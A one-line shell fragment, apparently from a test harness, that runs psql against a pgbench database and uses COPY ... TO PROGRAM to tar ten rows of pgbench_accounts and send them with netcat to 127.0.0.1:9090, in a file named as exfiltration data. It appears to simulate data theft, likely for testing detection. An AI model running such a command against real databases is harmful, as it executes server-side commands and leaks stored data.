...
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'tar -czf /tmp/exfil_tar_nc.dat - && nc -w 1 127.0.0.1 9090 < /tmp/exfil_tar_nc.dat 2>/dev/null || true';"
